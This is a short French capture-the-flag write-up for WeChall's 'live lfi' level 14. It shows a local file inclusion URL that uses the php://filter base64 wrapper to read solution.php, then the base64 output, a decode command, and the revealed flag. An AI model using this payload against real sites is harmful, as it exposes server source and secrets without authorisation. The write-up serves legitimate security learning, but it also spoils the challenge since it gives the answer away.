# Solution du niveau 14

### Afin de trouver le flag du niveau 14, voici comment j'ai procédé:

- On commence par se rendre sur le site de <b style = 'color: #aaff22' >wechall.net</b> et on accede au challenge ***live lfi***. On y trouve un lien qui nous redirige vers la page du niveau 14.

- Comme avec les niveaux precedent, le flag doit se trouver dans un fichier `solution`.  Il faut donc parcourir ce site pour trouver ce fichier. Pour se faire on peut utiliser <i style='color: #f4a21f'>PHP filter</i>. C'est une fonctionnalité qui permet de s'assurer que les données entrantes correspondent à des critères spécifiques.

- En plus de cette fonctionnalité, on utilisera aussi <i style='color: #f4a21f'>l'encodage en base64</i>  pour contourner les filtres ou les contrôles de sécurité mis en place par le site.

- En appliquant tous ces éléments avec l'url du site, on aura quelque chose comme ceci:
>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php

- On sera rediriger vers une page avec le long texte suivant :
> PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K

- Afin de comprendre ce que ce texte veut dire, il faut le convertir <i style='color: #f4a21f'>en encodage UTF-8</i>. Il existe plusieurs façon de s'y prendre:

    - soit à l'aide d'un site spécialisé dans ce domaine,

    - soit en utilisant la commande linux suivante: <pre>echo "<b style = 'color:cyan'>le texte en base 64 ici</b>" | base64 -d -i </pre>

- Une fois converti, on y trouvera le flag du niveau 14.

---

<!-- <html>
<body>
<pre style="color:#000;">teh falg si naer!</pre>
<pre style="color:#fff;">the flag is near!</pre>
</body>
</html>
<?php                  #   YOUR_TROPHY
return 'SteppinStones42Pie'; # <-´ ?> -->
